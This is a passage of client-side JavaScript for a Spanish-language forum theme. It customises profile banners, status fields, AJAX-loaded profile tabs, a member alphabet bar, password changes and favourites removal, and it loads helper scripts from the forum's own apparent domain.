            dom_firefox: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADVklEQVR4XmWPS2icZRSGn+/75/LPrdNOJpFkJs1trCUx2FZNsRspWtCgkQa7qFFRFCtG3UhFRWIVURHd2IUirQuxICGKiaWXGArVGjE1JSptYpq0uTmZpJlkJpnLP7fvcxZdiD7wbg7n5TxHJJ4O4+/sQrx2HTPgw/D6HlOm50NcnpDhcqOVwCtT7G++8kM+Z//o+MHzg6VJNwrAkkgtBQhjHiWxCmI+XbKdaG0Ihrp2V1NR34xZU0vcqIYl577jTw2dRZBFsI+bSI3ht870hc+0W6U3H6wJf9XuYrhD0ztrI+10kBF2bG4Hg9EI7326E5Il09hSGJSSywgQC4837PI69ajD58MoF+zWBv1jLrr3f4GtqgKb0NgyGZJTUyyNjlBnzTPRfRGHx0AJ0S433csz5m4XRpOT7HqCdMaicmOBl/oPEpw4haGhlEkhUnHCt+8gHt5H7Mc8siBITtoesa2syxcCoRKmzqNLoBG0dZYX7z9MdixI4rcLpKfLtvksvspGpNpMfWcJyGLeCB6S66cFXremMJ6lWNDE18A+O8b0iV5WF1bx+CqwFfJQtkhcHWPb8gWG/6oHp8CozWEL1kFhRlOMaiamBRU+aPH2MKWrcaskWgLKQK2vYaWydGxbYk8+g7YcyNoi0sqAWAMhAUMg7YJfPZ/Qo77nknqXpZ3fcqDFJLe2ChtpnNsbIFCkGLNT9BdicuQXNam8IN2wtUYj7JK+kxZ7r5zDmFnhraMXGez9DrW6yhOhLO2eGVSuElVULP4hzsu4O38sugzKAxUBqNoi2LvH5GecNI7U885iK/OLiucb0ny5I0ZztQPuvgedExz6OHoEIDDU2rR09dWIHn+ySUe7IjrV3aiLh2/VyVdu0z89d5eee6NF6547tf6mnNlHdX7ggL70YsvngBQD4QjHEisPPOsPnq5pAafpBq3wh+1U7VIUrSLWdYljK5gRic10kRgqrAQ+GL0j9XZbVEoDBlKJc58lb3TM/amX537PkFpTRC/nuNaXI9afY2MuRzZWJDdpMHMqN1gu35c60hYFECfrIgA8NDvlALa/Hwo93HaL9+VNfqPKtdmGyyjh9BkU/MbI1+Pxo6+fnRsuX77GTQT/JwCEAft/5uvA30CGf/EPKB5zlAmqZukAAAAASUVORK5CYII=" style="width: 12px;">',
            dom_safari: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACOklEQVQ4T6WTT0gTUBzHP08my00N1jZ1JhMXdKihMbMyPEQX7WJQS7IdDC0YXTtWdBE6dRQj8hAs/1BQXdZJImulNfojEmWKf8ot9yecupn/Xjzbpmu79eCdfu/7ed/fP8F/HrFTL6XMA1qA88BRwASEgDdAL9AvhNjcqUkDpJRVwADgGAslGJmL82tlA8MuDYctBRwwFSidHzgnhJhMQbYASfHr2diaufNlkI/BRFZiNWUFXG8oxVKYPw8cS0FE0vbwbGyttuPJNAsrGzmrkic32a3L516zFUtR/jvgiEpHAVoBT/vjaT4F4znFJUshjIkoY6b92Et19Jy2qncXhBAPFMD7IRBvbH80lVN8MPyF5skXdNZdSsd7zlRSXaZ7JoRoUoDQnZGQsdunUss8TdNDuD8/xXXiBjFtUTrorjdzuc4UEEJYFEB2Ds4x8D6aoW6wFdM26aU7WMzbEntGzFlj4NpJy6oQQrvloMs3b+wa2nawR6/B47JxazDA8/FYlrMrDWbc9ea0A69/drnRdf9va1Vfb57ai8cf4evP7HaqN71tNmrKt2vQKiUeZ883Rn/EsZfrmFtYJbK0nrOohyr09F20ZXRBje/wVPR37dm74ywmNtiUuRfEoNfQ37GPSoN2ew6Sk6iQvonwivnqwxlGv2fPQ3WFjttOK1aDVhWrXggxkUp56zsppYL0S4nDP7PMq4lFwsvrmAo1HK8qwmHVp3ahJSXOACQhO7fRARiBCKAs96n77zb+AZCI5hEGVdRyAAAAAElFTkSuQmCC" style="margin-top:-1px;width:13px">',
            dom_explorer: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADNUlEQVQ4T5WTe0hTcRTHz++6u7lclrqhYpZmNlPDV1q6RdIWWVoQ1R/VPz2tKIKKoAyiPyyiJCp6E73DyoLoYS8LihJSYzNLZ+qcm21Tpmtr97q7+zhh0YuC6vx5Dt/POXw5XwL/UdhemCAiXygxEEc40kIXNT4j/6IPdpWlUl5vJcGQDEW4SzHoxiFYiQSr/gyYsy0lO0mzsih9rD4r0hRfHN2ZWHFP8fBmp2oT1J22Dy8NXcnNo2gq4TeAasHOdVsXzjiwUJ+uSgw+haZXj+CkuwTaej+C68MHX8A/uJmvO3WOv5Q7XaZAyy8AunRrefn8mScNaYTo5a/QYjaZF9dPfeBnWF24Jmm6QqEkoX6ryHpca4YenzhPCOAPQPESdWyctn2LUYouzwyAtc3aXO2ZoKvaVsVA8W6ZJlFeG5ZcMEsc6AXW/tbHsB+18ORM33dAeEHZ0k3zVJc3G9Wk3+aHRZ51VaJcXjk+Kgq8Xi9kkMHl93vhEIYE4GzNIPndO5jaw/u+A6pP6I4nj0tcny4iLPJsAH9sGpczRsmlRlLAhiRweDi6ztyndNtdgO73EM44awdrKku/APiW/CKzTX50nGpSzoU2NRxRrYfJaaNC2XHhbHoEBTZWgpfdLLR2enHA6kDRacEoxmF2XttjJGjRjRQItz0oZhYH3/QU5TYuBz5LD+NTol4MeMS52hiALh4xgeUymq0eo7fbKkmuDnE047J4bh++TfiuPD0AMcBA6oajd3zqCquBUNn5EJOVwkMYWaUM+G/RERHJ8qBwo6OlN1V0OWH4giRZYHX71QNnCd+dXwJhsVOgg9u1t167//g7TYUvdiKRZWhBGR+JtIL2S4FgBGPrkwl2FxDmE6q5/vv2IdN8qKkRSagnN4/IppVBS0MpXdJUULbr7IpWHx50SvRojI4GeoQSkGEB/CxCiJdGEu5iAi9sfH16LTvsH0FbXjwPulLSVb+YNjTNHm4a910fq+Fdexo+qdN8PBXDC2KAE4QGoOiLwWPLnv+cH4KOQiWQjBje0VpPcdJDHJLakMMgsvBMsbTx3d/CRhDh6y+YctQCS2XKOMlKDKaevwm/zT8Dn9uLUCHmff0AAAAASUVORK5CYII=" style="margin-top:-1px;width:13px">',
            dom_opera: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJ0lEQVQ4T21TPWhUQRD+ZjdgOpt7dwFFTSFWlne3+05RFKNX+NOkCZIIKRKwiD8giEH8AVHBwhQxiIgSxMpCq4hgzuJ2z8PCxiqQCF6Ru3dNOovcjrwz77nvcLvvm5lvPmZmCQOvUy4fYSln4dxRZt4Th4UQv8C8SlIuBvX6N7+EErBWre7avbW1BOZLMecAJ4gMej0JIXSS55gXCsPD16lW2465vgADolsuv2MhLnjq1by1KzGOtJ5g4E0SI2A5Z+0UAdwXaCs1S0TP0i7AlxFrj/tWO0o1QVRMOCaaLBizTDw+Ljut1k8C9qYdmO8EjcbdjIDWDwDc9Lj1wNqD1NW65ICvA4OZCKx9O+BgCkSvMnlCFCnSeoaBJT/AwJmCtR99LlLqLBN9yAgQzVAnDOfBfH9A+URQr6/6XDsMx4g5I0rA7f8KCKKTOWM+ZwS0Pk1AfyvpY75Fba0nCXidccB8Pmg0MnYjpc4x0fuBvIu0WSqNCinXM8rAdN7alwNbmAbwwueGpNzfv4NNrWsCOOYFH+at9VeGdhg+IeZraQ7Rp7wxY38FKhUF5+oCEDEm4EfO2sPxpcU4vpWo1VoDMBpj59y2kLKYN+Z7+hfaSt0gokeeiyuBtQsx7mo9z8A97wovF4xZ3Gn2ryRS6mqP+bEQYmiH3WBmSUT7+ti53yTlXGDM86QqdZAQUaVyCMxzzHzKOXeAhHBwboOEWHG93tORZnPDH+QfP1HZVOXXqN8AAAAASUVORK5CYII=" style="margin-top:0;width:11px"/>',
        },
        iniciar: function () {
            $(function () {
                var a = $.getby('#qick_reg'),
                    b = $.getby('#tabs'),
                    c = $.getby('#cp-main'),
                    d = sub && $.getby('.topiclist'),
                    e = sub && $.getby('.subforo'),
                    f = $.getby('#main-content'),
                    g = [d, f],
                    h = $.getby('.dl_titulo'),
                    j = wl && $.getby('.activetab')[0].getElementsByTagName('span')[0].textContent.indexOf('Muro') > 0,
                    k = (mp || ps) && $.getby('#message-box');
                ml && ops.members(), ops.Co_Ki(), ops.pr_sr_(), (pr || sr) && (ops.eDO_p()), !ind && !sub && ops.prefijos_all_add(), ind && ops.r_iN(), tm && (ops.t_Tm(), ops.edited()), sub && (ops.pathSub(), ops.r_Sb()), (tm || ind && !ops.logout) && $.cachedScript('http://www.adictosalgear.org/js/reg.js'), ops.logout && a && (a.remove()), ops.progreso(), ops.status_box_html(), ops.news_first(), ops.menuactivo(), ops.toolbar_init(), (sub || ind) && ops.sub_ind_funciones(), (sub || tm) && ops.cambiar_boton(), pu && !ops.logout && (location.href = '/'), ps && (ops.poner_prefijos()), (pu || pr || sr) && ($._fadeIn(b, 500), ops.p_tabs_p_ajax(), c.style = 'display:block;opacity:1'), prAva && ops.avatar_mods(), mp && (ops.mp_otros(), ops.mP_Va(), ops.no_hay_mps(), ops.mp_nuevo()), pu && ops.logout && (ops.perfil_publico(), !/\/?u3wall$/.test(ts) && ops.sTP_u(), ops.html_perfil(), ops.add_mod(), ops.VsITs_()), (tm || mp || wl) && ops.sopiler_fx(), ops.logout && ops.Fv_tB_D(), $(window).scroll(ops.menufixed), ops.cT_Ajx(), ops.b_Vts(), ops.a_f(), ops.t_Fs(), ops.actividad_f(), ops.panel_log(), ops.staff_alert(), setInterval(ops.reload_news, 3e5), ops.AnNd_(), ops.logout && ops.init_check_mp(), ops.logout && ops.fx_Tb(), tm && (ops.h_Tf(), ops.C_pSo(), ops.add_amigos_post()), (pr || sr) && ops.R_sC_P();
                $(window).load(function () {
                    if (sub) {
                        for (var i = 0; i < g.length; i++) {
                            g[i].style = 'display:block'
                        }
                        e[0].style.display = 'block'
                    }
                    sub && (ops.pag_ajx_sub(), ops.fV_Sb()), ps && ops.tM_Sm(), (mp || ps) && ($._fadeIn(k, 500), h.length && (h[0].style = "display:block")), (ind) && (ops.Me_Mo(), ops.actividad()), ind && (ops.last_user_fix(), ops.open_blank(), ops.pF_In(), ops.aV_In(), ops.iP_wL()), (ind || tm) && ops.c_A_jx(), ops.confirm(), ops.broken_link(), j && (ops.ani_text(), ops.focus_text());
                    ops.nC_Tm();
                    setTimeout(function () {
                        !tm && ops.b_UnL()
                    }, 2000);
                    setTimeout(function () {
                        tm && (ops.pg_jx(), ops.tooltipster_init(), ops.trafico()), ops.QTips(), ops.inload_(), (isPostReply || isMPpostReply) && ops.texto_save(), (ps || isMPNew || isMPpost || isMPedit) && (ops.value_default()), !ops.logout && (ops.C_Ol())
                    }, 500)
                });
            });
        },
        edited: function () {
            try {
                var a = $.getby('.edited');
                for (var i = 0; i < a.length; i++) {
                    if (a[i].innerHTML == '') {
                        a[i].remove()
                    } else {
                        var h = a[i].textContent.match(/\Ú([A-Za-z])+.*/g)[0];
                        a[i].setAttribute('title', h);
                        a[i].innerHTML = h;
                    }
                }
            } catch (a) {
                'undefined' != typeof console && console.error(a)
            }
        },
        back_jx: function () {
            ops.back();
            $.getby('#lightBG').innerHTML += '<center style="color:#fff;min-height:600px"><i style="color:#fff;margin-top:20%;" class="fa fa-spinner fa-pulse fa-3x fa-fw"></i> Cargando... </center>'
        },
        portada_perfil: function () {
            var e, a = $.getby('#field_id3'),
                b = $.getby('#profile_field_13_3'),
                d = $.getby('#profile-advanced-banner');
            if (a) {
                a.onmouseenter = function () {
                    e = $.getby('.ajax-profil_edit')[0];
                    e.onclick = function () {
                        a.onmouseenter = false;
                        b.onfocus = function () {
                            b.nextElementSibling.onclick = function () {
                                b.nextElementSibling.onclick = false;
                                console.log('instalar banner');
                                e = d.getElementsByTagName('img')[0];
                                e.src = b.value;
                                $._fadeIn(e, 400);
                                console.log('Ok: Banner Perfil actualizado');
                                ops.notify(ops.mi_nombre + ': Banner Perfil actualizado');
                                Cookies.remove('banner_src' + ops.nombre_perfil);
                                Cookies.set('banner_src' + ops.mi_nombre, b.value, {
                                    expires: 1
                                })
                            }
                        }
                    }
                }
            }
        },
        status_perfil: function () {
            var f, g, h, a = $.getby('#profile_field_13_1'),
                b = /(Se modifico:)(\w.+)(?=\[\/td\]\[\/table\])/g,
                c = /(.+)(?=\[table(.*)])/g,
                d = new Date().getDate(),
                e = new Date().getMonth();
            a && (a.onblur = function () {
                a.value += ' [table class=fecha_up][td]Se modifico:' + d + '/' + ((e + 1) < 10 ? '0' + (e + 1) : (e + 1)) + '/' + (new Date().getFullYear() - 2000) + ' - ' + (new Date()).getHours() + ':' + ((new Date()).getMinutes() < 10 ? '0' + (new Date()).getMinutes() : (new Date()).getMinutes()) + ' hrs.[/td][/table]';
                f = $.getby('.ajax-profil_valid')[0];
                g = $.getby('.mi_status')[0];
                h = $.getby('.status_fecha')[0];
                f.onclick = function () {
                    g.textContent = a.value.match(c)[0];
                    h.textContent = a.value.match(b)[0];
                    console.log('Ok: Estado de perfil actualizado');
                }
            })
        },
        html_perfil: function () {
            var a = $.getby('.field_uneditable'),
                b = a.length
            for (var i = 0; i < b; i++) {
                a[i].innerHTML = ops.BBCodeToHtml(a[i].innerHTML)
            }
        },
        sTP_u: function () {
            var b, d, e, f, g, h, i, j, k, l, m, a = '<b class="mi_status" style="display:none"></b><b class="status_fecha" style="font-size:9px;position:absolute;color:rgb(255, 255, 255);line-height:3.3;">En progreso</b>',
                c = $.getby('#banner-image');
            c.insertAdjacentHTML('beforebegin', a);
            e = $.getby('.mi_status')[0];
            g = $.getby('.status_fecha')[0];
            b = $.getby('#field_id1');
            i = Cookies.get('perfil_status' + ops.nombre_perfil);
            j = $.getby('#profile-advanced-add');
            k = j && j.outerHTML,
                l = /(Se modifico:)(\w.+)(?=\[\/td\]\[\/table\])/g,
                m = /(.+)(?=\[table(.*)])/g;
            j && c.insertAdjacentHTML('afterend', k);
            j && j.remove();
            if (b) {
                d = b && b.getElementsByClassName('field_uneditable')[0];
                i != d.textContent && Cookies.remove('perfil_status' + ops.nombre_perfil);
                f = d.textContent.match(m)[0];
                h = d.textContent.match(l)[0];
                e.textContent = f;
                g.textContent = h;
                Cookies.set('perfil_status' + ops.nombre_perfil, d.textContent, {
                    expires: 365
                })
            } else {
                if (i) {
                    e.textContent = i.match(m)[0];
                    g.textContent = i.match(l)[0];
                    console.log('Se establecio el status por galleta');
                } else {
                    $.get('/u' + location.pathname.match(/\d/g)[0], function (e) {
                        var o = $('#field_id1 .field_uneditable', e)[0],
                            r = o.textContent,
                            p = r.match(m)[0],
                            q = r.match(l)[0];
                        e.textContent = p;
                        $.getby('.status_fecha').textContent = q;
                        Cookies.set('perfil_status' + ops.nombre_perfil, r, {
                            expires: 365
                        }), console.log('Se establecio el status  ajax')
                    })
                }
            }
            $._fadeIn(e, 200)
        },
        pr_sr_: function () {
            if (pr || sr) {
                var h, a = $.getby('.activetab')[0].getElementsByTagName('a')[0],
                    b = $.getby('#cp-main'),
                    c = $.getby('#tabs').getElementsByTagName('a')[0],
                    d = 'width:1010px;margin-left:-32px;margin-top:-5px;height:315px;border:1px solid #0A0202;',
                    e = ops.lang.banner_blank,
                    f = '<div id="profile-advanced-banner" align="center"><img id="banner-image" style="' + d + '"src="' + e + '" /></div>',
                    g = $.getby('#main'),
                    j = $.getby('#profile_field_13_3');
                g.classList.add('profile_');
                a.innerHTML.indexOf('Amigos') > 1 && (ops.eD_Ams());
                a.innerHTML.indexOf('Preferencia') > 1 && (ops.cPrf(), ops.confirm());
                c.href = 'profile?mode=editprofile';
                b.insertAdjacentHTML('afterbegin', f);
                h = $.getby('#banner-image');
                if (j) {
                    h.src = j.value;
                    var r = 'banner_src' + ops.mi_nombre;
                    if (!Cookies.get('banner_src' + ops.mi_nombre)) {
                        Cookies.set(r, j.value, {
                            expires: 1
                        });
                    }
                    console.log('banner desde value')
                } else if (Cookies.get('banner_src' + ops.mi_nombre)) {
                    var t = Cookies.get('banner_src' + ops.mi_nombre);
                    h.src = t;
                    console.log('banner desde galleta')
                } else $.get('/u' + ops.mi_id, function (e) {
                    var i = $('.field_uneditable', e)[1].textContent;
                    h.src = i;
                    var r = 'banner_src' + ops.mi_nombre;
                    Cookies.set(r, i, {
                        expires: 1
                    });
                    console.log('banner desde ajax')
                });
                ops.oEd_P();
                ops.prefijos_all_add()
            }
        },
        b_pr_sr: function () {
            var a = $.getby('.activetab')[0],
                b = $.getby('.module')[1];
            a.textContent.indexOf('migos') < 0 && b.style.visibility == 'hidden' && b.getElementsByTagName('div')[2].textContent.indexOf('aún no tiene ningún amigo') != 0 && (b.style.visibility = 'visible');
        },
        perfil_publico: function () {
            var B, C, E, G, e, w, A, t, s, u, v, a = $.getby('.activetab')[0],
                H = $.getby('#main-content'),
                b = a.textContent.indexOf('visitantes') > 0,
                c = /\/?u3wall$/.test(ts),
                d = /\/?u89wall$/.test(ts),
                f = /\/?u92wall$/.test(ts),
                g = /\/?u17wall$/.test(ts),
                h = $.getby('h1')[0],
                i = $.getby('#field_id3'),
                j = $.getby('#profile-advanced-details'),
                k = $.getby('#tabs').getElementsByTagName('a')[0],
                m = $.getby('.module')[0],
                l = m.getElementsByClassName('h3')[0],
                B = m.getElementsByTagName('img')[0],
                n = 'width:994px;margin-left:-10px;height:315px;border-bottom:1px solid rgb(154, 154, 154);',
                o = $.getby('#profile-advanced-details'),
                p = $.getby('#profile-advanced-right'),
                q = $.getby('#profile-advanced-left'),
                r = $.getby('.module')[1],
                x = $.getby('.page-title')[0],
                z = a.textContent.indexOf('migos') < 0;
            H.classList.add('profile-fix');
            ops.ocultar_mod();
            ops.oc_fl();
            m.classList.add('modulo_uno');
            r.classList.add('modulo_dos');
            r.style = 'border: none!important; background: 0 0!important; box-shadow: none!important; color: #fff';
            $(m).prependTo(q);
            w = p.outerHTML,
                A = o.getElementsByClassName('panel')[0];
            A.insertAdjacentHTML('afterbegin', w);
            ops.N_Fr_mD(), ops.status_perfil()
            x.remove();
            ct && $('#field_id-22').nextAll().remove();
            wl && (c || d || f || g) ? ops.historial() : (ops.R_oWl(), b && (ops.muro_f(), ops.otros_muro(), ops.f_WL_c()));
            h.textContent = c ? 'Actividad de los usarios' : d ? 'Registro de Likes' : f ? 'Registro de Estados' : g && 'Estados del Chat';
            i ? (e = i.children[1].children[0].textContent, t = '<div id="profile-advanced-banner" align="center"><img id="banner-image" style="' + n + '" src="' + e + '" /></div>', j.insertAdjacentHTML('afterbegin', t), ops.soy_staff && ops.mod_f_(), i.children[1].children[0].textContent = '[img]' + e + '[/img]') : c || d || f || g || ops.establecer_banner();
            ops.location();
            fr && ops.f_tab_pu();
            if (!wl || b && ops.nombre_perfil != ops.mi_nombre) {
                l.insertAdjacentHTML('afterbegin', '<a onclick="ops.toque_f()" href="javascript:void(0)" class="pokie local">Dar un toque</a>');
            }
            s = $.getby('.modulo_dos')[0],
                u = s.getElementsByTagName('div')[2],
                E = $.getby('.modulo_uno')[0]
            v = 'aún no tiene ningún amigo',
                G = $.getby('.modulo_uno')[0].getElementsByTagName('em').length;
            z && s.style.visibility == 'hidden' && u.textContent.indexOf(v) < 0 && (s.style.visibility = 'visible');
            setTimeout(function () {
                ops.etiquetas_pu(), ops.online_pu(), ops.AdPf_()
            }, 200);
            C = G ? E.getElementsByClassName('h3')[0].clientWidth - 35 : E.getElementsByClassName('h3')[0].clientWidth + 80;
            E.getElementsByTagName('img')[0].style = 'display:inline-flex;margin-left:-' + C + 'px!important';
        },
        active: (pu || sr || pr) && $.getby('.activetab')[0],
        oc_fl: function () {
            if (_userdata.user_level !== 1 && ops.active.innerHTML.indexOf('Perfil') > 0) {
                var n = $.getby('#field_id1'),
                    o = $.getby('#field_id3'),
                    p = $.getby('#field_id4'),
                    q = $.getby('#field_id5'),
                    r = [n, o, p, q];
                for (var i = 0; i < r.length; i++) {
                    r[i].style.display = 'none';
                }
            }
        },
        pu_all_: function (html) {
            var a = $.getby('.activetab')[0],
                b = a.innerHTML,
                c = b.indexOf('fa-th-large') > 0,
                d = b.indexOf('Perfil') > 0,
                e = b.indexOf('Estadísticas') > 0,
                f = b.indexOf('migos') > 0,
                g = b.indexOf('Contacto') > 0,
                h = ops.count != 0 ? '(' + ops.count + ') ' : '',
                i = $.getby('#profile-advanced-details').getElementsByClassName('panel')[0],
                j = $.getby('#tabs').getElementsByTagName('span')[0],
                k = $.getby('#main'),
                l = $.getby('#main-content'),
                m = $.getby('.modulo_dos')[0];
            l.classList.add('profile-fix');
            i.insertAdjacentHTML('afterbegin', '<div id="profile-advanced-right">' + html + '</div>');
            !f && k.classList.remove('amigos');
            !c && k.classList.remove('wall', 'no_friend');
            ops.N_Fr_mD(), ops.status_perfil(), ops.html_perfil(), ops.ocultar_mod();
            if (c) {
                ops.R_oWl(), ops.muro_f(), ops.otros_muro(), ops.ani_text(), ops.focus_text(), ops.f_WL_c(), ops.confirm(), k.classList.add('wall');
            } else if (g) {
                $('#field_id-22').nextAll().remove();
                document.title = h + 'Contacto - ' + ops.nombre_perfil;
                ops.mod_f_();
            } else if (f) {
                ops.f_tab_pu(), ops.confirm();
            } else if (e) {
                document.title = h + 'Estadísticas - ' + ops.nombre_perfil;
            } else if (d) {
                document.title = h + 'Perfil - ' + ops.nombre_perfil;
                ops.mod_f_();
                ops.rC_tB();
                ops.oc_fl()
            }!c && (j.innerHTML = '<i class="fa fa-th-large"></i> Muro');
        },
        mod_f_: function () {
            $.getScript('http://adictosalgear.org/js/edit_c_ajx.js').done(function () {
                ops.portada_perfil(), ops.VsITs_()
            });
        },
        rC_tB: function () {
            var a = $.getby('.activetab'),
                b = a.length,
                c = b && a[0].textContent.indexOf('uro') > 0,
                d = b && a[0].textContent.indexOf('migos') > 0,
                f = !$.getby('#notif_list').getElementsByClassName('unread').length,
                h = $.getby('#notif_unread'),
                i = ops.nombre_perfil,
                j = ops.mi_nombre,
                e;
            (c || d) && (wl && c || c && i != i ? ops.titulo_pagina = 'Muro de ' + i : wl && c || c && i === i ? ops.titulo_pagina = 'Mi muro' : fr && c || d && i != i ? ops.titulo_pagina = 'Amigos de ' + i : (fr && d || d && i === i) && (ops.titulo_pagina = 'Mis amigos')), f && '' == h.innerHTML ? document.title = ops.titulo_pagina : 'block' == $(h).css('display') && h.textContent.length > 0 && 0 != ops.count && (wl && c || c && i != i ? e = '(' + ops.count + ') Muro de ' + i : wl && c || c && i === i ? e = '(' + ops.count + ') Mi muro' : fr && d || d && i != i ? e = '(' + ops.count + ') Amigos de ' + i : (fr && d || d && i === i) && (e = '(' + ops.count + ') Mis amigos'));
        },
        p_tabs_p_ajax: function () {
            var a = $.getby('#tabs').getElementsByTagName('a');
            for (var i in a)
                a[i].onclick = function (a) {
                    $.getby('.activetab')[0].classList.remove('activetab');
                    this.parentNode.classList.add('activetab');
                    var b = this.href,
                        c = pu && $.getby('#profile-advanced-right').innerHTML;
                    ops.back_jx();
                    ops.pr_tabsp_ajax(b, c);
                    return false;
                }
        },
        pr_tabsp_ajax: function (b, c) {
            $.get(b, function (e) {
                var a = $('#cp-main', e)[0].innerHTML,
                    d = $.getby('#cp-main');
                d.innerHTML = a
            }).success(function () {
                pr || sr ? ops.pr_sr_() : pu && ops.pu_all_(c);
                ops.b_pr_sr();
                ops.back_close();
            })
        },
        position_ml: 'top',
        presets: ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'],
        bar: $('<div id="memberlist_alphabar" />')[0],
        list: ml && $.getby('#memberlist').nextSibling,
        change: function (a) {
            if (a.id != 'alphabar_actif') {
                var actif = $.getby('alphabar_actif');
                if (actif) actif.id = '';
                a.id = 'alphabar_actif';
                $.get(a.href, function (d) {
                    ops.list.parentNode.innerHTML = $('#memberlist', d)[0].parentNode.innerHTML;
                    ops.list = $.getby('#memberlist').nextSibling;
                    ops.insertBar();
                });
            }
        },
        insertBar: function () {
            ops.bar.className = 'alphabar_' + ops.position_ml;
            ops.list.className += ' alphalist_' + ops.position_ml;
            ops.list.parentNode.insertBefore(ops.bar, ops.position_ml.toLowerCase() == 'bottom' ? ops.list.nextSibling : ops.list);
            /left|right/i.test(ops.position_ml) && ops.list.insertAdjacentHTML('afterend', '<div class="clear"></div>');
        },
        members: function () {
            if (ml) {
                if (ops.list) {
                    for (var i = 0, j = ops.presets.length, newRow = /left|right/i.test(ops.position_ml), htmlStr = '<table><tbody>' + (newRow ? '' : '<tr>'); i < j; i++) {
                        htmlStr += (newRow ? '<tr>' : '') + '<td><a href="/memberlist?mode=lastvisit&order=DESC&submit=Ok&username=' + ops.presets[i] + '" ' + (new RegExp('username=' + ops.presets[i].replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + '(?:$|&)').test(window.location.search) ? 'id="alphabar_actif"' : '') + ' onclick="ops.change(this); return false;">' + ops.presets[i] + '</a></td>' + (newRow ? '</tr>' : '');
                    }
                    ops.bar.innerHTML = htmlStr + (newRow ? '' : '</tr>') + '</tbody></table>';
                    ops.insertBar();
                }
            }
        },
        vRpC_: function (c) {
            var a = $.getby('#new_password'),
                b = $.getby('#password_confirm'),
                c = $.getby('#cur_password');
            a.value != b.value ? ($.boxes('alert', 'No coinciden las contraseñas, escribelas de nuevo')) : $.post('/profile', {
                cur_password: c.value,
                new_password: a.value,
                password_confirm: b.value,
                change_password: 'change_password',
                page_profil: 'informations',
                mode: 'editprofile',
                user_id: ops.mi_id,
                submit: 1
            }).success(function (e) {
                var d = $('.error', e)[0],
                    f = 'Debes completar los campos obligatorios',
                    g = 'ingresaste no coincide',
                    h = 'La contraseña actual que ingresaste no coincide',
                    i = 'Tu contraseña no respeta las medidas',
                    j = 'Prueba con una contraseña más compleja',
                    k = 'Tu perfil ha sido actualizado',
                    l = ops.mi_nombre + ': tu contraseña se cambió con éxito';
                return -1 != d.textContent.indexOf(f) ? ($.boxes('alert', f), !1) : -1 != d.textContent.indexOf(g) ? ($.boxes('alert', h), !1) : -1 != d.textContent.indexOf(i) ? ($.boxes('alert', j), !1) : void(-1 != d.textContent.indexOf(k) && (a.value = '', b.value = '', c.value = '', ops.notify(l), setTimeout(function () {
                    $('.l_pass').slideUp(function () {
                        $(this).remove()
                    })
                }, 1000)))
            }).fail(function (e) {
                console.log('Error')
            })
        },
        f_hg: function (c) {
            c.parentNode.outerHTML += ops.lang.l_pass;
        },
        R_sC_P: function () {
            var a = $.getby('.activetab')[0],
                b = a.getElementsByTagName('a')[0].textContent.match(/\S(\w.+)/g)[0],
                c = document.forms.post,
                d = $.getby('.button1')[0],
                e = 'background-image: linear-gradient(rgb(66, 165, 225),rgb(38, 124, 194));border: none!important;border-radius: 3px;color: rgb(255, 255, 255);padding: 1px 5px',
                k = b == 'Información',
                l = b == 'Favoritos',
                m = b == 'Supervisados';
            if (k) {
                var f = $.getby('.field_c_r')[1].getElementsByClassName('f_cr'),
                    g = [f[3], f[4], f[5], f[6], f[7]],
                    h = $.getby('.contactos_reg')[0],
                    j = $.getby('#password_');
                for (var i = 0; i < g.length; i++) {
                    g[i].remove()
                }
                h.style.display = 'none';
                d.onclick = function () {
                    ops.fun_serialize_p();
                    return false
                };
                j.innerHTML = '<button id="change_pass" onclick="ops.f_hg(this);return false" style="' + e + '">Modificar</button>';
            } else if (l || m) {
                var k = b == 'Favoritos';
                d.onclick = function () {
                    $.post(c.action, $(c).serialize() + '&confirm=1').done(function () {
                        ops.notify(ops.mi_nombre + ' se eliminaron temas de tus ' + (l ? 'favoritos' : 'supervisados'))
                    }).done(function () {
                        var f = document.querySelectorAll('tr input[type="checkbox"]:checked');
                        for (var i = 0; i < f.length; i++) {
                            console.log(f[i].parentNode.parentNode.getElementsByClassName('topictitle')[0].textContent);
                            $._fadeOut(f[i].parentNode.parentNode, 200)
                        }
                    });
                    return false
                };
            }
        },
        oEd_P: function () {
            if (pr) {
                var b, e = ' comentó en: ',
                    t = 'este tema ',
                    c = document.querySelectorAll('.hidden-if-toolbar-deactivated .table1 td:first-child');
                for (var i = 0; i < c.length; i++) {
                    var o = c[i].innerHTML,
                        a = o.match(/^(.*) ha escrito un mensaje en (<a href="\/t[0-9]+(p[0-9]+)?-([^#?"]*)[^"]+">)[^<]+<\/a>$/);
                    a && (b = a[1] + e + a[2], o = a[4], o = 'topic' === o || /^[\s-]*$/.test(o) ? t : o.replace(/-/g, ' ').replace(/(^\s+|\s+$)/g, ''), c[i].innerHTML = b + o + '</a>')
                }
            }
        },
        eD_Ams: function () {
            var b, a = $.getby('.friends-foes-list'),
                d = $.getby('#main-content'),
                c = '<i class="fa fa-wifi online" style="color:rgb(0, 128, 0);vertical-align:bottom;text-shadow:0 1px rgb(255, 255, 255);"></i>',
                e = $.getby('.page-title'),
                f = document.title;
            f = 'Amigos';
            d.classList.add('user-ctrl-friends');
            e.length == 4 && e[3].nextSibling.remove();
            for (var i = 0; i < a.length; i++) {
                b = a[i].getElementsByTagName('em');
                if (b.length) {
                    b[0].innerHTML = c;
                }
            }
            ops.confirm(), ops.aVP_s_()
        },
        cPrf: function () { //mejorar
            var a = $.getby('.pref_tres'),
                b = $.getby('.pref_siete'),
                c = $.getby('.pref_siete');
            a[0].children[0].children[0].textContent = 'Autorizar los mensajes en mi muro :';
            b[0].children[1].children[0].children[0].setAttribute('disabled', true);
            b[0].children[1].children[0].children[0].style.opacity = 0.5;
            $('input[value="Registrar"]').on('click', function (e) {
                e.preventDefault();
                $.post('/profile', {
                    viewemail: $('.pref_uno').find(':checked').val(),
                    view_pm: $('.pref_dos').find(':checked').val(),
